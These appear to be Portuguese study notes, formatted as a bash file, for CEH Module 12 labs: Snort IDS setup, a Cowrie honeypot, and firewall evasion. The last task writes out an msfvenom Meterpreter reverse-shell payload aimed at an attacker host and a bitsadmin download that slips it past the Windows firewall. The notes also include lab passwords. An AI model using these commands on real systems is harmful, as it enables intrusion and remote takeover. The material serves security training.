#!/bin/bash



###############
# MOD 12 - Lab 1: Perform Intrusion Detection using Various Tools
###############

########
# TASK 1: Detect Intrusions using Snort
########

# Objetivo Geral
# Detectar tráfego malicioso na rede utilizando o IDS Snort instalado em um sistema Windows
# Processar instalação, configuração, execução e validação do Snort através de um ataque simulado (ping ICMP).

# Instalação do Snort
#   Ações executadas:
#       Acessar a máquina Windows 11 e navegar até o diretório:
E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort
#       Instalar o arquivo:
Snort_2_9_15_Installe.x64.exe
#       Confirmar pop-ups e aceitar os termos de licença.
#   Resultado:
#       Snort é instalado no caminho padrão:
C:\Snort\

# Copiar e substituir arquivos de regras
#   Ações:
#       Copiar pastas e arquivos do pacote de regras para os diretórios do Snort:
#       Copiar snort.conf para:
C:\Snort\etc\
#       Substituir/copiar as seguintes pastas:
#           so_rules
#           preproc_rules
#           rules
#   Origem dos arquivos:
E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150

# Testar a execução do Snort
#   Ações:
#       Abrir o Prompt de Comando:
cd C:\Snort\bin
#       Testar o Snort:
snort
#           (esperar inicializar e usar Ctrl + C para encerrar)
#       Verificar interfaces de rede disponíveis:
snort -W
#       Ativar modo "sniffer" na interface de rede (índice 2 neste exemplo):
snort -dev -i 2
#       Em outro terminal, gerar tráfego com:
ping google.com
#   Resultado:
#       Snort detecta tráfego ICMP e exibe alertas em tempo real no terminal.

# Configurar o arquivo snort.conf
#   Ações principais:
#       Definir variáveis de rede:
#           HOME_NET → IP da máquina com Snort (ex: 10.10.1.11)
#           EXTERNAL_NET → permanece como any
#           Outros (DNS, HTTP, etc.): manter default se não aplicável
#       Configurar paths para regras:
var RULE_PATH C:\Snort\rules
var SO_RULE_PATH C:\Snort\so_rules
var PREPROC_RULE_PATH C:\Snort\preproc_rules
#       Criar arquivos obrigatórios de listas:
#           Criar white_list.rules e black_list.rules em:
C:\Snort\rules
#       Configurar bibliotecas dinâmicas:
#           Linha 243:
dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
#           Linha 246:
dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll
#           Comentar linha 249 (# dynamicdetection)
#       Desativar preprocessadores desnecessários:
#           Comentar linhas 261 a 265
#       Corrigir bug de parsing:
#           Linha 321,  deletar a palavra
lzma
#       Configurar output plugins:
#           Especificar caminhos:
config classification: C:\Snort\etc\classification.config
config reference: C:\Snort\etc\reference.config
output alert_fast: alerts.ids
#       Substituir todas as ocorrências de ipvar por var:
# Ctrl + H (Replace All)

# Criar regra de detecção ICMP
#   Ação:
#       Abrir o arquivo:
C:\Snort\rules\icmp-info.rules
#       Inserir a regra:
alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.11 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)

# Rodar Snort em modo IDS
#   Comando:
snort -i2 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
#   Explicação dos parâmetros:
#       -i2 → Interface número 2
#       -A console → Mostrar alertas no console
#       -c → Arquivo de configuração a ser usado
#       -l → Diretório de logs
#       -K ascii → Formato dos logs

# Simular ataque (teste ICMP)
#   Ação:
#       Na máquina Windows Server 2019 (atacante):
ping 10.10.1.11 -t
#       Voltar à máquina Windows 11 (vítima), onde Snort está rodando
#   Resultado:
#       Snort dispara alerta no terminal ao detectar pacotes ICMP de fora para o HOME_NET.

# Verificar os logs de alerta
#   Caminho:
C:\Snort\log\10.10.1.19\ICMP_ECHO.ids
#       Onde 10.10.1.19 é o IP da máquina atacante.

#   Conclusão
#       Esse laboratório permite:
#           Entender o funcionamento básico do Snort como IDS
#           Criar e aplicar regras de detecção
#           Realizar testes simples para validar a eficácia das regras
#           Aprender a manipular arquivos de configuração e paths
#           Investigar alertas por meio de logs estruturados


########
# TASK 2: Deploy Cowrie Honeypot to Detect Malicious Network Traffic
########

# Objetivo
#   Implantar o honeypot Cowrie em uma máquina Ubuntu para simular um serviço SSH vulnerável
#   Capturar tentativas de ataques e comandos executados por invasores.

# Criar usuário dedicado para o Cowrie
sudo adduser --disabled-password cowrie
#   Cria o usuário cowrie sem senha.
#   Esse usuário executará o honeypot de forma isolada, aumentando a segurança.

# Obter o diretório do Cowrie (via compartilhamento SMB)
#   Se disponível:
#       Navegue até:
ceh-tools on 10.10.1.11/CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots/Honeypot Tools/
#   Copie a pasta cowrie para /home/ubuntu
#       Se não disponível, acesse:
+ Outras Localizações 
smb://10.10.1.11
#           Login:
#               Usuário: Admin
#               Senha: Pa$$w0rd
#   Copie a pasta CEH-Tools ➝ cowrie para /home/ubuntu

# Instalar dependências do Cowrie
sudo su
cd /home/ubuntu/cowrie
pip install --upgrade -r requirements.txt

# Ajustar permissões da pasta do Cowrie
cd /home/ubuntu
chmod -R 777 cowrie

# Redirecionar tráfego da porta 22 para 2222
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
#   Explicação:
#       Redireciona qualquer conexão na porta 22 (SSH real) para a porta 2222 (onde o Cowrie escuta).
#       Protege o serviço SSH real, direcionando invasores para o honeypot.

# Configurar o authbind para permitir escuta na porta 22
touch /etc/authbind/byport/22
chown cowrie:cowrie /etc/authbind/byport/22
chmod 770 /etc/authbind/byport/22
#   Permite que o Cowrie escute na porta 22 sem privilégios de root, usando authbind.

# Criar e ativar ambiente virtual Python
cd /home/ubuntu/cowrie
virtualenv --python=python3 cowrie-env
source cowrie-env/local/bin/activate

# Iniciar o Cowrie honeypot
cd cowrie
bin/cowrie start
#   Inicia o honeypot.
#   Escuta conexões SSH na porta 2222 (ou redirecionada da 22).

# Verificar se o honeypot está rodando
sudo su
cd /home/ubuntu/cowrie/var/log/cowrie
tail cowrie.log
#   Verifica os logs de atividades.
#   A mensagem Ready to accept SSH connections indica que o honeypot está ativo.


# Ação do atacante - Simulação no Parrot Security
#   Escanear o IP da máquina Ubuntu (honeypot) com Nmap
nmap -p- -sV 10.10.1.9
#       Verifica quais portas estão abertas.
#       Confirma a presença da porta 22 (que redireciona para o honeypot).

# Acessar via SSH com PuTTY
putty
#   Insira o IP do alvo (10.10.1.9) e tente login via SSH com:
#       ubuntu:toor
#       root:<qualquer senha>
#   O Cowrie aceita qualquer senha com usuário root (login padrão do honeypot).

# Monitorar atividades do invasor
#   Verificar os logs novamente (atividade do invasor)
tail cowrie.log
#   Comandos comuns executados pelo invasor (exemplos simulados)
id          # Ver info do usuário atual
whoami      # Nome do usuário
pwd         # Diretório atual
cd ..       # Navegar
ls          # Listar arquivos
ls -la      # Listar com detalhes
#       Todos os comandos são registrados nos logs do Cowrie, permitindo auditoria e detecção de comportamento.

# Conclusão
#   Ao final do experimento:
#       Você terá um honeypot funcional escutando na porta 22.
#       Toda tentativa de conexão via SSH e os comandos executados pelos atacantes serão capturados e armazenados.
#       É possível aplicar medidas proativas de segurança com base nesses logs.


###############
# MOD 12 - Lab 2: Evade IDS/Firewalls using Various Evasion Techniques
###############

########
# TASK 1: Evade Firewall through Windows BITSAdmin
########

# Objetivo
#   Evadir o firewall da máquina-alvo e transferir um arquivo malicioso da máquina atacante para a máquina vítima sem ser bloqueado 
#   Utilizar o serviço legítimo do Windows BITS (Background Intelligent Transfer Service).

# Ferramentas e Ambientes
#   Parrot Security	        Atacante	    msfvenom, apache2, cp, chmod, mkdir
#   Windows Server 2019	    Vítima	        PowerShell, BITSAdmin

# Conceito Central: Evasão com BITSAdmin
#   O BITSAdmin é um utilitário de linha de comando para manipular transferências via BITS, usado por aplicações do Windows Update e outros processos legítimos. Ele é tolerado por firewalls e antivírus porque simula um comportamento “normal” do sistema.
#   Motivo da Evasão Ser Eficaz:
#       Firewall permite tráfego HTTP de BITS por ser legítimo e assinado pelo próprio sistema.

# Preparar Firewall da Vítima (Simulação de ambiente protegido)
#   Acesse: Painel de Controle
#   Vá para: Sistema e Segurança → Firewall do Windows Defender
#   Ative:
#       Rede privada: Ativar o Firewall
#       Rede pública: Ativar o Firewall
#   Clique em OK
#   Resultado: A máquina está protegida por firewall e não deveria aceitar facilmente conexões externas com ferramentas comuns como wget, curl ou Invoke-WebRequest.

# Criar Payload na máquina atacante (Parrot Security)
#   Acessar root:
sudo su
#   Senha: toor

# Criar Payload com Meterpreter:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > /home/attacker/Exploit.exe
#   Explicação dos parâmetros:
#       -p windows/meterpreter/reverse_tcp: tipo de payload
#       LHOST: IP da máquina atacante
#       LPORT: porta de escuta
#       -f exe: formato do payload
#       >: redireciona a saída para um arquivo

# Compartilhar o Payload via servidor Apache
#   Criar diretório compartilhado:
mkdir /var/www/html/share
#   Permitir acesso ao diretório:
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
#   Mover o payload para o diretório compartilhado:
cp /home/attacker/Exploit.exe /var/www/html/share/
#   Iniciar o servidor Apache:
service apache2 start
#       Resultado: O payload está disponível via HTTP em http://10.10.1.13/share/Exploit.exe

# Transferir arquivo usando BITSAdmin (máquina vítima – Windows Server)
#   Abrir PowerShell:
#       Pesquisar por PowerShell e abrir como administrador.
#   Comando para transferir o payload usando BITS:
bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe C:\Exploit.exe
#   Explicação dos parâmetros:
#       /transfer: inicia um novo job
#       Exploit.exe: nome do job
#       URL de origem: onde está hospedado o arquivo (máquina atacante)
#       Caminho de destino: onde o arquivo será salvo na máquina vítima
#   Resultado: O arquivo é transferido com sucesso mesmo com firewall ativo.

# Verificar transferência
#   Navegar até o diretório de destino:
C:\Exploit.exe
#   O arquivo estará lá pronto para ser executado (se o atacante quiser iniciar uma sessão reversa com Metasploit, por exemplo).

# Técnicas de Evasão Utilizadas (explicadas)
#   Evasão via serviço legítimo (BITS)	    Usa um serviço nativo e confiável do Windows
#   HTTP padrão (porta 80)	                Utiliza tráfego que geralmente é permitido por firewalls
#   Bypass de Firewall	                    O BITS não é bloqueado por padrão por regras comuns de firewall
#   Sem interação do usuário	            A transferência ocorre silenciosamente
#   Payload com Meterpreter	                Após execução, pode dar controle remoto à máquina atacante

# Resumo Geral para Documentação
#   Nome do Lab: Firewall Evasion via BITSAdmin
#   Objetivo: Transferir arquivo malicioso usando canal permitido
#   Ferramentas:
#       Parrot Security (msfvenom, Apache)
#       Windows Server 2019 (BITSAdmin, PowerShell)

# Etapas principais:
#   Criar payload com msfvenom
#   Compartilhar payload com Apache
#   Transferir usando BITSAdmin
#   Verificar arquivo no C:\

# Evasão:
#   Firewall ativo
#   Transferência HTTP via BITS
#   Nenhuma detecção direta
# Arquivo: Exploit.exe
# URL de origem: http://10.10.1.13/share/Exploit.exe
# Local salvo: C:\Exploit.exe
# Status: Sucesso (firewall foi contornado)